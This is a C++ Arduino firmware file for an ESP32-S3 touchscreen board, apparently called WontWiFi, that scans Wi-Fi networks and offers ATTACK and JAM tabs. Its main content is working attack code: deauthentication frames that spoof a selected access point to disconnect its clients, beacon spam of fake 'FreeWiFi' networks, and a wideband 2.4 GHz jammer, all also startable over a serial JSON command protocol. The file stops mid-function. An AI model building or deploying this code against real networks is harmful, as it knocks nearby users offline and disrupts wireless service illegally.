/**
 * WontWiFi TFT Edition
 * Version: 1.1.0
 * Target: Hosyond ESP32-S3 2.8" ILI9341 Black CYD (Capacitive Touch + WS2812B)
 *
 * Dual interface:
 *   - Touchscreen: fully standalone, no computer needed
 *   - Serial/Web UI: same JSON command protocol as wontwifi2 v1.5.1
 *     Connect via USB, open the WontWiFi web app, works identically
 *
 * Both interfaces are always active simultaneously.
 *
 * Required libraries (Arduino Library Manager):
 *   - TFT_eSPI by Bodmer  (copy User_Setup.h to library folder first!)
 *   - FastLED by Daniel Garcia
 *
 * IMPORTANT: Copy the User_Setup.h from this sketch folder into:
 *   Documents/Arduino/libraries/TFT_eSPI/User_Setup.h
 *   (overwrite the existing one)
 *
 * Pin map — Hosyond / Black CYD S3 (adjust #defines below if different):
 *   TFT SPI : MOSI=13, SCLK=12, CS=10, DC=11, RST=-1, BL=42
 *   Touch   : SDA=6,  SCL=7,  INT=0  (CST816S, I2C addr 0x15)
 *   NeoPixel: DATA=48
 */

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <Wire.h>
#include <TFT_eSPI.h>
#include <FastLED.h>

// ================================================================
//  BOARD PIN MAP  — change these if your wiring differs
// ================================================================
#define PIN_NEOPIXEL   48   // WS2812B data
#define PIN_TFT_BL     42   // Backlight (HIGH = on)
#define PIN_TOUCH_SDA   6   // Capacitive touch I2C SDA
#define PIN_TOUCH_SCL   7   // Capacitive touch I2C SCL
#define PIN_TOUCH_INT   0   // Touch interrupt pin (-1 to disable / use polling)
#define PIN_TOUCH_RST  -1   // Touch controller reset (-1 = not connected)

// Touch controller I2C address
//   CST816S = 0x15  |  GT911 = 0x5D or 0x14
#define TOUCH_ADDR  0x15

// Touch coordinate mapping — flip if taps land on wrong spot
#define TOUCH_SWAP_XY   false
#define TOUCH_INVERT_X  false
#define TOUCH_INVERT_Y  false

// ================================================================
//  DISPLAY + LED OBJECTS
// ================================================================
TFT_eSPI tft = TFT_eSPI();

#define NUM_LEDS 1
CRGB leds[NUM_LEDS];

// ================================================================
//  COLORS (RGB565)
// ================================================================
#define C_BG          0x0000  // black
#define C_HEADER      0x0821  // dark navy
#define C_TEXT        0xFFFF  // white
#define C_SUBTEXT     0x8C51  // mid-gray
#define C_LINE        0x2104  // dark divider
#define C_TAB_BG      0x18C3  // dark tab
#define C_TAB_SEL     0x2986  // active tab
#define C_BTN_GREEN   0x07C0  // start
#define C_BTN_RED     0xF800  // stop / danger
#define C_BTN_ORANGE  0xFC60  // warning / deauth
#define C_BTN_YELLOW  0xFFE0  // beacon
#define C_BTN_BLUE    0x355F  // info
#define C_BTN_GREY    0x4208  // disabled
#define C_SIG_GOOD    0x07E0
#define C_SIG_MED     0xFFE0
#define C_SIG_BAD     0xF800

// ================================================================
//  LAYOUT
// ================================================================
#define SCR_W         240
#define SCR_H         320
#define HDR_H          36
#define TAB_H          48
#define CONTENT_Y     HDR_H
#define CONTENT_H     (SCR_H - HDR_H - TAB_H)   // 236 px
#define CONTENT_BOT   (SCR_H - TAB_H)            // 272

// ================================================================
//  TAB IDs
// ================================================================
#define TAB_SCAN    0
#define TAB_ATTACK  1
#define TAB_JAM     2
#define TAB_INFO    3
#define TAB_COUNT   4
const char* TAB_NAMES[TAB_COUNT] = {"SCAN", "ATTACK", "JAM", "INFO"};

// ================================================================
//  APP STATE
// ================================================================
uint8_t  activeTab    = TAB_SCAN;
bool     needsRedraw  = true;

// ---- Scan ---------------------------------------------------
#define MAX_APS 30
struct AP {
  char    ssid[33];
  char    bssid[18];
  int8_t  rssi;
  uint8_t ch;
  uint8_t enc;
};
AP      aps[MAX_APS];
int     apCount     = 0;
int     apScroll    = 0;
int     apSelected  = -1;
bool    scanning    = false;

// ---- Deauth -------------------------------------------------
bool     deauthOn       = false;
uint8_t  deauthBSSID[6] = {0};
uint8_t  deauthCh       = 1;
uint32_t deauthSent     = 0;
uint32_t lastDeauthMs   = 0;

// ---- Beacon -------------------------------------------------
#define  MAX_BEACON  50
bool     beaconOn       = false;
uint8_t  beaconCh       = 6;
uint8_t  beaconCnt      = 10;
uint8_t  beaconIdx      = 0;
uint32_t lastBeaconMs   = 0;
uint8_t  beaconMACs[MAX_BEACON][6];
const char* beaconPrefix = "FreeWiFi";

// ---- Jammer -------------------------------------------------
bool     jamOn          = false;
bool     jamWide        = true;
uint8_t  jamCh          = 6;
uint8_t  jamCurCh       = 1;

// ================================================================
//  TOUCH — CST816S raw I2C driver
// ================================================================
struct Touch { int16_t x, y; bool down; };
Touch    prevTouch   = {0, 0, false};
bool     tapDetected = false;
int16_t  tapX = 0, tapY = 0;
uint32_t touchDownMs = 0;

bool readTouch(Touch& t) {
  Wire.beginTransmission(TOUCH_ADDR);
  Wire.write(0x01);
  if (Wire.endTransmission(false) != 0) { t.down = false; return false; }
  Wire.requestFrom(TOUCH_ADDR, 6);
  if (Wire.available() < 6) { t.down = false; return false; }
  Wire.read();                        // gesture
  uint8_t fingers = Wire.read() & 0x0F;
  uint8_t xh = Wire.read(), xl = Wire.read();
  uint8_t yh = Wire.read(), yl = Wire.read();
  if (!fingers) { t.down = false; return false; }
  t.x   = ((xh & 0x0F) << 8) | xl;
  t.y   = ((yh & 0x0F) << 8) | yl;
  t.down = true;
  return true;
}

void mapTouch(Touch& t) {
  if (TOUCH_SWAP_XY)  { int16_t tmp = t.x; t.x = t.y; t.y = tmp; }
  if (TOUCH_INVERT_X) t.x = SCR_W - 1 - t.x;
  if (TOUCH_INVERT_Y) t.y = SCR_H - 1 - t.y;
}

void processTouches() {
  tapDetected = false;
  Touch cur;
  readTouch(cur);
  if (cur.down) mapTouch(cur);

  if (cur.down && !prevTouch.down)  touchDownMs = millis();
  if (!cur.down && prevTouch.down) {
    if (millis() - touchDownMs < 400) {  // short lift = tap
      tapDetected = true;
      tapX = prevTouch.x;
      tapY = prevTouch.y;
    }
  }
  prevTouch = cur;
}

// ================================================================
//  DRAW HELPERS
// ================================================================
void drawHeader(const char* subtitle) {
  tft.fillRect(0, 0, SCR_W, HDR_H, C_HEADER);
  tft.setTextDatum(ML_DATUM);
  tft.setTextColor(C_TEXT, C_HEADER);
  tft.drawString("WontWiFi", 8, HDR_H / 2, 4);
  tft.setTextDatum(MR_DATUM);
  tft.setTextColor(C_SUBTEXT, C_HEADER);
  tft.drawString(subtitle, SCR_W - 6, HDR_H / 2, 2);
}

void drawTabBar() {
  int w = SCR_W / TAB_COUNT;
  for (int i = 0; i < TAB_COUNT; i++) {
    uint16_t bg = (i == activeTab) ? C_TAB_SEL : C_TAB_BG;
    uint16_t fg = (i == activeTab) ? C_TEXT : C_SUBTEXT;
    tft.fillRect(i * w, SCR_H - TAB_H, w, TAB_H, bg);
    tft.setTextDatum(MC_DATUM);
    tft.setTextColor(fg, bg);
    tft.drawString(TAB_NAMES[i], i * w + w / 2, SCR_H - TAB_H / 2, 2);
    if (i) tft.drawFastVLine(i * w, SCR_H - TAB_H, TAB_H, C_LINE);
  }
}

void drawBtn(int x, int y, int w, int h, const char* lbl,
             uint16_t bg, uint16_t fg = 0xFFFF, uint8_t font = 2) {
  tft.fillRoundRect(x, y, w, h, 6, bg);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(fg, bg);
  tft.drawString(lbl, x + w / 2, y + h / 2, font);
}

uint16_t sigColor(int8_t r) {
  return (r >= -60) ? C_SIG_GOOD : (r >= -75) ? C_SIG_MED : C_SIG_BAD;
}

const char* encLabel(uint8_t e) {
  switch (e) { case 0: return "OPEN"; case 1: return "WEP";
               case 2: return "WPA";  case 3: return "WPA2";
               case 4: return "WPA/2"; case 5: return "WPA3"; default: return "?"; }
}

// ================================================================
//  SCAN TAB
// ================================================================
#define ROW_H   38
#define AP_ROWS ((CONTENT_H - 48) / ROW_H)

void drawScanTab() {
  tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BG);
  drawHeader("Scan");

  // --- top bar ---
  uint16_t btnBg = scanning ? C_BTN_GREY : C_BTN_GREEN;
  drawBtn(6, CONTENT_Y + 5, 108, 34, scanning ? "Scanning..." : "SCAN", btnBg);

  if (apSelected >= 0) {
    tft.setTextColor(C_BTN_ORANGE, C_BG);
    tft.setTextDatum(ML_DATUM);
    char sel[18]; snprintf(sel, sizeof(sel), "%.17s", aps[apSelected].ssid);
    tft.drawString(sel, 122, CONTENT_Y + 22, 1);
  } else {
    tft.setTextColor(C_SUBTEXT, C_BG);
    tft.setTextDatum(ML_DATUM);
    tft.drawString("Tap row to select AP", 122, CONTENT_Y + 22, 1);
  }

  int listY = CONTENT_Y + 46;
  tft.drawFastHLine(0, listY - 1, SCR_W, C_LINE);

  if (!apCount) {
    tft.setTextColor(C_SUBTEXT, C_BG);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("Press SCAN", SCR_W / 2, listY + 60, 2);
    tft.drawString("to find networks", SCR_W / 2, listY + 82, 2);
    return;
  }

  int end = min(apScroll + AP_ROWS, apCount);
  for (int i = apScroll; i < end; i++) {
    int row = i - apScroll;
    int ry  = listY + row * ROW_H;
    bool sel = (i == apSelected);
    uint16_t rbg = sel ? 0x0861 : C_BG;

    tft.fillRect(0, ry, SCR_W - 20, ROW_H - 1, rbg);

    // SSID
    tft.setTextDatum(ML_DATUM);
    tft.setTextColor(sel ? C_BTN_ORANGE : C_TEXT, rbg);
    char ssid[17]; snprintf(ssid, sizeof(ssid), "%.16s", aps[i].ssid);
    tft.drawString(ssid, 4, ry + 10, 2);

    // meta: channel + enc
    tft.setTextColor(C_SUBTEXT, rbg);
    char meta[16]; snprintf(meta, sizeof(meta), "CH%d  %s", aps[i].ch, encLabel(aps[i].enc));
    tft.drawString(meta, 4, ry + 25, 1);

    // RSSI
    tft.setTextColor(sigColor(aps[i].rssi), rbg);
    tft.setTextDatum(MR_DATUM);
    char rssiStr[8]; snprintf(rssiStr, sizeof(rssiStr), "%d", aps[i].rssi);
    tft.drawString(rssiStr, SCR_W - 22, ry + 19, 1);

    tft.drawFastHLine(0, ry + ROW_H - 1, SCR_W, C_LINE);
  }

  // Scroll arrows (right strip)
  tft.fillRect(SCR_W - 20, listY, 20, CONTENT_H - 46, C_LINE);
  if (apScroll > 0) {
    tft.setTextColor(C_TEXT, C_LINE);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("/\\", SCR_W - 10, listY + 12, 2);
  }
  if (apScroll + AP_ROWS < apCount) {
    tft.setTextColor(C_TEXT, C_LINE);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("\\/", SCR_W - 10, CONTENT_BOT - 14, 2);
  }
}

void handleScanTap(int16_t x, int16_t y) {
  // SCAN button
  if (x >= 6 && x <= 114 && y >= CONTENT_Y + 5 && y <= CONTENT_Y + 39) {
    if (!scanning) {
      // kick off blocking scan — draw "Scanning..." first
      scanning = true; needsRedraw = true;
      drawScanTab(); drawTabBar();
      doScan();
    }
    return;
  }
  // Scroll strip
  if (x >= SCR_W - 20) {
    int listY = CONTENT_Y + 46;
    if (y < listY + 24 && apScroll > 0)            { apScroll--; needsRedraw = true; }
    else if (y > CONTENT_BOT - 24 && apScroll + AP_ROWS < apCount) { apScroll++; needsRedraw = true; }
    return;
  }
  // AP row tap
  int listY = CONTENT_Y + 46;
  if (y >= listY && y < CONTENT_BOT) {
    int idx = apScroll + (y - listY) / ROW_H;
    if (idx >= 0 && idx < apCount) {
      apSelected = (apSelected == idx) ? -1 : idx;
      needsRedraw = true;
    }
  }
}

// ================================================================
//  ATTACK TAB
// ================================================================
// Precalculate Y positions
#define ATK_DEAUTH_BTN_Y  (CONTENT_Y + 70)
#define ATK_DIV_Y         (ATK_DEAUTH_BTN_Y + 44)
#define ATK_BEACON_BTN_Y  (ATK_DIV_Y + 52)
#define ATK_CH_BTN_Y      (ATK_BEACON_BTN_Y + 44)

void drawAttackTab() {
  tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BG);
  drawHeader("Attack");

  int y = CONTENT_Y + 8;

  // — Deauth section —
  tft.setTextColor(C_BTN_ORANGE, C_BG);
  tft.setTextDatum(ML_DATUM);
  tft.drawString("DEAUTH", 8, y + 8, 4);

  y += 30;
  if (apSelected >= 0) {
    tft.setTextColor(C_TEXT, C_BG);
    char info[40];
    snprintf(info, sizeof(info), "%.15s  CH%d", aps[apSelected].ssid, aps[apSelected].ch);
    tft.drawString(info, 8, y, 1);
  } else {
    tft.setTextColor(C_SUBTEXT, C_BG);
    tft.drawString("Select AP on Scan tab first", 8, y, 1);
  }

  y += 14;
  bool canDeauth = (apSelected >= 0) && !beaconOn && !jamOn;
  if (deauthOn) {
    char lbl[24]; snprintf(lbl, sizeof(lbl), "STOP  (%lu sent)", deauthSent);
    drawBtn(8, y, 224, 36, lbl, C_BTN_RED);
  } else {
    drawBtn(8, y, 224, 36, "START DEAUTH", canDeauth ? C_BTN_ORANGE : C_BTN_GREY);
  }

  y += 48;
  tft.drawFastHLine(0, y, SCR_W, C_LINE);
  y += 8;

  // — Beacon section —
  tft.setTextColor(C_BTN_YELLOW, C_BG);
  tft.setTextDatum(ML_DATUM);
  tft.drawString("BEACON SPAM", 8, y + 8, 2);
  y += 22;

  tft.setTextColor(C_SUBTEXT, C_BG);
  char binfo[40];
  snprintf(binfo, sizeof(binfo), "Prefix: %s  x%d  CH%d", beaconPrefix, beaconCnt, beaconCh);
  tft.drawString(binfo, 8, y, 1);
  y += 14;

  bool canBeacon = !deauthOn && !jamOn;
  if (beaconOn) {
    drawBtn(8, y, 224, 36, "STOP BEACON", C_BTN_RED);
  } else {
    drawBtn(8, y, 224, 36, "START BEACON", canBeacon ? C_BTN_YELLOW : C_BTN_GREY, 0x0000);
  }

  y += 44;
  // Channel selector
  tft.setTextColor(C_SUBTEXT, C_BG);
  tft.setTextDatum(ML_DATUM);
  tft.drawString("Beacon CH:", 8, y + 10, 1);
  drawBtn(90,  y, 32, 28, "-", C_BTN_GREY);
  char chS[4]; snprintf(chS, sizeof(chS), "%d", beaconCh);
  tft.setTextColor(C_TEXT, C_BG); tft.setTextDatum(MC_DATUM);
  tft.drawString(chS, 138, y + 14, 2);
  drawBtn(156, y, 32, 28, "+", C_BTN_GREY);
}

void handleAttackTap(int16_t x, int16_t y) {
  int deauthBtnY = CONTENT_Y + 8 + 30 + 14;
  int beaconBtnY = deauthBtnY + 48 + 8 + 22 + 14;
  int chBtnY     = beaconBtnY + 44;

  // Deauth button
  if (x >= 8 && x <= 232 && y >= deauthBtnY && y <= deauthBtnY + 36) {
    if (deauthOn) { stopDeauth(); }
    else if (apSelected >= 0 && !beaconOn && !jamOn) { startDeauth(); }
    needsRedraw = true; return;
  }
  // Beacon button
  if (x >= 8 && x <= 232 && y >= beaconBtnY && y <= beaconBtnY + 36) {
    if (beaconOn) { stopBeacon(); }
    else if (!deauthOn && !jamOn) { startBeacon(); }
    needsRedraw = true; return;
  }
  // Channel –
  if (x >= 90 && x <= 122 && y >= chBtnY && y <= chBtnY + 28 && !beaconOn) {
    if (beaconCh > 1) { beaconCh--; needsRedraw = true; }
  }
  // Channel +
  if (x >= 156 && x <= 188 && y >= chBtnY && y <= chBtnY + 28 && !beaconOn) {
    if (beaconCh < 13) { beaconCh++; needsRedraw = true; }
  }
}

// ================================================================
//  JAMMER TAB
// ================================================================
void drawJamTab() {
  tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BG);
  drawHeader("Jammer");

  int y = CONTENT_Y + 14;

  tft.setTextColor(C_SUBTEXT, C_BG);
  tft.setTextDatum(ML_DATUM);
  tft.drawString("Mode:", 8, y + 10, 2);
  drawBtn(68,  y, 78, 32, "WIDEBAND",  jamWide  ? C_BTN_GREEN : C_BTN_GREY);
  drawBtn(152, y, 78, 32, "CHANNEL",  !jamWide  ? C_BTN_GREEN : C_BTN_GREY);

  y += 44;

  if (!jamWide) {
    tft.setTextColor(C_SUBTEXT, C_BG);
    tft.setTextDatum(ML_DATUM);
    tft.drawString("Channel:", 8, y + 10, 1);
    drawBtn(78,  y, 32, 28, "-", C_BTN_GREY);
    char ch[4]; snprintf(ch, sizeof(ch), "%d", jamCh);
    tft.setTextColor(C_TEXT, C_BG); tft.setTextDatum(MC_DATUM);
    tft.drawString(ch, 128, y + 14, 2);
    drawBtn(148, y, 32, 28, "+", C_BTN_GREY);
    y += 40;
  }

  y += 8;
  bool canJam = !deauthOn && !beaconOn;
  if (jamOn) {
    drawBtn(8, y, 224, 48, "STOP JAMMER", C_BTN_RED);
  } else {
    const char* lbl = jamWide ? "START WIDEBAND JAM" : "START CHANNEL JAM";
    drawBtn(8, y, 224, 48, lbl, canJam ? C_BTN_RED : C_BTN_GREY);
  }

  y += 60;
  if (jamOn) {
    tft.setTextColor(C_BTN_RED, C_BG);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("! JAMMING ACTIVE !", SCR_W / 2, y, 2);
    y += 22;
    tft.setTextColor(C_SUBTEXT, C_BG);
    if (jamWide) {
      tft.drawString("Full 2.4 GHz band", SCR_W / 2, y, 1);
    } else {
      char msg[20]; snprintf(msg, sizeof(msg), "Channel %d only", jamCh);
      tft.drawString(msg, SCR_W / 2, y, 1);
    }
  } else {
    tft.setTextColor(C_SUBTEXT, C_BG);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("Floods 2.4 GHz with", SCR_W / 2, y, 1);
    tft.drawString("random 802.11 frames", SCR_W / 2, y + 16, 1);
  }
}

void handleJamTap(int16_t x, int16_t y) {
  int modeY  = CONTENT_Y + 14;
  int chBtnY = modeY + 44;
  int startY = (!jamWide ? chBtnY + 40 : modeY + 44) + 8;

  // Mode toggle
  if (y >= modeY && y <= modeY + 32 && !jamOn) {
    if (x >= 68  && x <= 146) { jamWide = true;  needsRedraw = true; }
    if (x >= 152 && x <= 230) { jamWide = false; needsRedraw = true; }
    return;
  }
  // Channel buttons (single mode only)
  if (!jamWide && y >= chBtnY && y <= chBtnY + 28 && !jamOn) {
    if (x >= 78  && x <= 110 && jamCh > 1)  { jamCh--; needsRedraw = true; }
    if (x >= 148 && x <= 180 && jamCh < 13) { jamCh++; needsRedraw = true; }
    return;
  }
  // Start / Stop
  if (y >= startY && y <= startY + 48) {
    if (jamOn) { stopJammer(); }
    else if (!deauthOn && !beaconOn) { startJammer(); }
    needsRedraw = true;
  }
}

// ================================================================
//  INFO TAB
// ================================================================
void drawInfoTab() {
  tft.fillRect(0, CONTENT_Y, SCR_W, CONTENT_H, C_BG);
  drawHeader("Info");

  int y = CONTENT_Y + 16;
  tft.setTextDatum(ML_DATUM);

  auto infoRow = [&](const char* label, const char* val) {
    tft.setTextColor(C_SUBTEXT, C_BG); tft.drawString(label, 8,   y, 1);
    tft.setTextColor(C_TEXT,    C_BG); tft.drawString(val,   120, y, 1);
    y += 22;
    tft.drawFastHLine(0, y - 4, SCR_W, C_LINE);
  };

  infoRow("Firmware:",  "WontWiFi-TFT v1.0");
  infoRow("Chip:",      "ESP32-S3 Black CYD");
  infoRow("Display:",   "2.8\" ILI9341 IPS");
  infoRow("Touch:",     "Capacitive CST816S");

  char heap[16]; snprintf(heap, sizeof(heap), "%d KB", ESP.getFreeHeap() / 1024);
  infoRow("Free Heap:", heap);

  char flash[16]; snprintf(flash, sizeof(flash), "%d MB", ESP.getFlashChipSize() / 1024 / 1024);
  infoRow("Flash:",     flash);

  const char* mode = deauthOn ? "DEAUTH" : beaconOn ? "BEACON" : jamOn ? "JAMMER" : "IDLE";
  infoRow("Mode:",      mode);

  char apStr[8]; snprintf(apStr, sizeof(apStr), "%d", apCount);
  infoRow("APs Seen:",  apStr);

  if (apSelected >= 0) {
    infoRow("Selected AP:", aps[apSelected].ssid);
    infoRow("BSSID:",       aps[apSelected].bssid);
    char ch[8]; snprintf(ch, sizeof(ch), "%d", aps[apSelected].ch);
    infoRow("Channel:",  ch);
    char rssiS[8]; snprintf(rssiS, sizeof(rssiS), "%d dBm", aps[apSelected].rssi);
    infoRow("RSSI:",     rssiS);
  }
}

// ================================================================
//  WIFI ACTIONS
// ================================================================
int encCode(wifi_auth_mode_t m) {
  switch (m) {
    case WIFI_AUTH_OPEN:         return 0;
    case WIFI_AUTH_WEP:          return 1;
    case WIFI_AUTH_WPA_PSK:      return 2;
    case WIFI_AUTH_WPA2_PSK:     return 3;
    case WIFI_AUTH_WPA_WPA2_PSK: return 4;
    case WIFI_AUTH_WPA3_PSK:     return 5;
    default:                     return 3;
  }
}

void doScan() {
  apCount = 0; apScroll = 0; apSelected = -1;
  leds[0] = CRGB::Yellow; FastLED.show();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  int n = WiFi.scanNetworks(false, true);
  if (n > MAX_APS) n = MAX_APS;
  if (n > 0) {
    apCount = n;
    for (int i = 0; i < n; i++) {
      strncpy(aps[i].ssid,  WiFi.SSID(i).c_str(),      32); aps[i].ssid[32]  = 0;
      strncpy(aps[i].bssid, WiFi.BSSIDstr(i).c_str(),  17); aps[i].bssid[17] = 0;
      aps[i].rssi = WiFi.RSSI(i);
      aps[i].ch   = WiFi.channel(i);
      aps[i].enc  = encCode(WiFi.encryptionType(i));
    }
    WiFi.scanDelete();
  }
  leds[0] = CRGB::Black; FastLED.show();
  scanning = false;
  needsRedraw = true;
}

bool parseBSSID(const char* s, uint8_t* out) {
  if (strlen(s) < 17) return false;
  for (int i = 0; i < 6; i++) {
    char b[3] = {s[i * 3], s[i * 3 + 1], 0};
    out[i] = (uint8_t)strtol(b, nullptr, 16);
  }
  return true;
}

// ---- Deauth ----
void startDeauth() {
  if (apSelected < 0 || beaconOn || jamOn) return;
  parseBSSID(aps[apSelected].bssid, deauthBSSID);
  deauthCh   = aps[apSelected].ch;
  deauthSent = 0;
  WiFi.mode(WIFI_AP);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
  esp_wifi_set_channel(deauthCh, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  deauthOn = true;
  leds[0] = CRGB::Red; FastLED.show();
}

void stopDeauth() {
  if (!deauthOn) return;
  deauthOn = false;
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_mode(WIFI_MODE_STA);
  leds[0] = CRGB::Black; FastLED.show();
  needsRedraw = true;
}

void sendDeauthFrame() {
  uint8_t f[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
    0,0,0,0,0,0,                          // SA: BSSID (filled)
    0,0,0,0,0,0,                          // BSSID (filled)
    0x00, 0x00,                           // Seq
    0x07, 0x00                            // Reason: class 3 nonassoc
  };
  memcpy(&f[10], deauthBSSID, 6);
  memcpy(&f[16], deauthBSSID, 6);
  esp_wifi_set_channel(deauthCh, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
  deauthSent++;
}

// ---- Beacon ----
void startBeacon() {
  if (deauthOn || jamOn) return;
  beaconIdx = 0;
  // Generate one stable MAC per fake SSID
  for (int i = 0; i < beaconCnt; i++) {
    uint32_t r1 = esp_random(), r2 = esp_random();
    memcpy(beaconMACs[i], &r1, 4);
    memcpy(beaconMACs[i] + 4, &r2, 2);
    beaconMACs[i][0] = (beaconMACs[i][0] & 0xFE) | 0x02;  // locally administered
  }
  WiFi.mode(WIFI_AP);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
  esp_wifi_set_channel(beaconCh, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  beaconOn = true;
  leds[0] = CRGB::Blue; FastLED.show();
}

void stopBeacon() {
  if (!beaconOn) return;
  beaconOn = false;
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_mode(WIFI_MODE_STA);
  leds[0] = CRGB::Black; FastLED.show();
  needsRedraw = true;
}

void sendBeaconBurst() {
  for (uint8_t i = 0; i < beaconCnt; i++) {
    String ssid = String(beaconPrefix) + String(i);
    uint8_t ssidLen = min((int)ssid.length(), 32);
    uint8_t* mac = beaconMACs[i];

    uint8_t f[128]; uint8_t p = 0;
    f[p++] = 0x80; f[p++] = 0x00;  // FC: Beacon
    f[p++] = 0x00; f[p++] = 0x00;  // Duration
    f[p++] = 0xFF; f[p++] = 0xFF; f[p++] = 0xFF; f[p++] = 0xFF; f[p++] = 0xFF; f[p++] = 0xFF; // DA bcast
    memcpy(&f[p], mac, 6); p += 6;  // SA
    memcpy(&f[p], mac, 6); p += 6;  // BSSID
    f[p++] = 0x00; f[p++] = 0x00;  // Seq
    uint64_t ts = (uint64_t)micros();
    memcpy(&f[p], &ts, 8); p += 8;  // Timestamp
    f[p++] = 0x64; f[p++] = 0x00;  // Beacon interval: 100 TU
    f[p++] = 0x21; f[p++] = 0x04;  // Capability: ESS + short preamble
    f[p++] = 0x00; f[p++] = ssidLen; // SSID IE
    memcpy(&f[p], ssid.c_str(), ssidLen); p += ssidLen;
    f[p++] = 0x01; f[p++] = 0x08;  // Supported rates
    f[p++] = 0x82; f[p++] = 0x84; f[p++] = 0x8B; f[p++] = 0x96;
    f[p++] = 0x24; f[p++] = 0x30; f[p++] = 0x48; f[p++] = 0x6C;
    f[p++] = 0x03; f[p++] = 0x01; f[p++] = beaconCh;  // DS param set

    esp_wifi_80211_tx(WIFI_IF_AP, f, p, false);
  }
}

// ---- Jammer ----
void startJammer() {
  if (deauthOn || beaconOn) return;
  jamCurCh = 1;
  WiFi.mode(WIFI_AP);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
  if (!jamWide) esp_wifi_set_channel(jamCh, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  jamOn = true;
  leds[0] = CRGB::Purple; FastLED.show();
}

void stopJammer() {
  if (!jamOn) return;
  jamOn = false;
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_mode(WIFI_MODE_STA);
  leds[0] = CRGB::Black; FastLED.show();
  needsRedraw = true;
}

void doJamBurst() {
  uint8_t pkt[64];
  pkt[0] = 0x08; pkt[1] = 0x00; pkt[2] = 0x00; pkt[3] = 0x00;
  for (int i = 4; i < 64; i += 4) { uint32_t r = esp_random(); memcpy(&pkt[i], &r, 4); }
  if (jamWide) {
    jamCurCh = (jamCurCh % 13) + 1;
    esp_wifi_set_channel(jamCurCh, WIFI_SECOND_CHAN_NONE);
  }
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, 64, false);
}

// ================================================================
//  SERIAL COMMAND PROTOCOL  (identical to wontwifi2 v1.5.1)
//  Lets the WontWiFi web UI control this device over USB just like
//  the non-TFT firmware — both interfaces work simultaneously.
// ================================================================
String cmdBuffer = "";

String jsonEscape(const String& s) {
  String out; out.reserve(s.length() + 4);
  for (char c : s) {
    if      (c == '"')  out += "\\\"";
    else if (c == '\\') out += "\\\\";
    else if (c == '\n') out += "\\n";
    else if (c == '\r') out += "\\r";
    else if (c == '\t') out += "\\t";
    else out += c;
  }
  return out;
}

void serialEmitScan() {
  String json = "{\"type\":\"scan\",\"ts\":";
  json += String(millis());
  json += ",\"count\":"; json += String(apCount);
  json += ",\"aps\":[";
  for (int i = 0; i < apCount; i++) {
    if (i) json += ",";
    json += "{\"ssid\":\"";  json += jsonEscape(String(aps[i].ssid));
    json += "\",\"bssid\":\""; json += aps[i].bssid;
    json += "\",\"ch\":";    json += aps[i].ch;
    json += ",\"rssi\":";    json += aps[i].rssi;
    json += ",\"enc\":";     json += aps[i].enc;
    json += ",\"band\":\"";  json += (aps[i].ch >= 36 ? "5" : "2.4");
    json += "\"}";
  }
  json += "]}";
  Serial.println(json);
}

// Serial-triggered deauth — takes bssid/channel/count directly (no apSelected needed)
void startDeauthSerial(const String& bssid, uint8_t ch, int count) {
  if (beaconOn || jamOn) return;
  if (!parseBSSID(bssid.c_str(), deauthBSSID)) {
    Serial.println("{\"type\":\"error\",\"msg\":\"invalid_bssid\"}"); return;
  }
  deauthCh   = constrain(ch, 1, 13);
  deauthSent = 0;
  WiFi.mode(WIFI_AP);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
  esp_wifi_set_channel(deauthCh, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  deauthOn = true;
  leds[0] = CRGB::Red; FastLED.show();
  needsRedraw = true;
  Serial.printf("{\"type\":\"status\",\"status\":\"deauth_on\",\"bssid\":\"%s\",\"channel\":%d}\n",
                bssid.c_str(), deauthCh);
}

void handleCommand(String cmd) {
  cmd.trim();
  String c = cmd; c.toUpperCase();

  if (c.startsWith("NOISE_ON")) {
    String p = cmd.substring(9); p.trim();
    if (p.length() == 0) {
      // Wideband — map to jammer wideband
      jamWide = true; startJammer();
      Serial.println("{\"type\":\"status\",\"status\":\"wideband_on\",\"mode\":\"full_2.4ghz\"}");
    } else {
      jamCh = constrain((uint8_t)p.toInt(), 1, 13);
      jamWide = false; startJammer();
      Serial.printf("{\"type\":\"status\",\"status\":\"noise_on\",\"channel\":%d}\n", jamCh);
    }
  }
  else if (c == "NOISE_OFF") {
    stopJammer();
    Serial.println("{\"type\":\"status\",\"status\":\"noise_off\"}");
  }
  else if (c == "SCAN") {
    Serial.println("{\"type\":\"status\",\"msg\":\"scanning\"}");
    scanning = true; needsRedraw = true;
    if (activeTab == TAB_SCAN) { drawScanTab(); drawTabBar(); }
    doScan();
    serialEmitScan();
  }
  else if (c == "AUTO_ON")  { Serial.println("{\"type\":\"status\",\"msg\":\"auto_on\"}"); }
